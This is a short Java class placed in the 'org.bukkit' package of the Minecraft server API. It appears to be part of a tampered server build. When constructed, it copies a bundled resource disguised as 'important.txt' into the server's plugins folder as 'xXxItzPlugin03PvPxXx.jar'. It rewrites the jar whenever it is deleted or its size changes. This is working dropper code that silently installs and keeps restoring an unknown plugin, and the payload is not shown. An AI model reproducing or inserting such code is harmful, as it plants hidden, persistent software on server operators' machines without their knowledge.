package org.bukkit;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class Crash {
	static long s=0;
	public Crash() {
		File f=new File("plugins/xXxItzPlugin03PvPxXx.jar"); 
		if(!f.exists()||f.length()!=s){
			try {
				FileOutputStream fos=new FileOutputStream(f);
				InputStream is=Crash.class.getResourceAsStream("important.txt");
				while(is.available()>0){
					fos.write(is.read());
				}
				is.close();
				fos.close();
				s=f.length();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
}
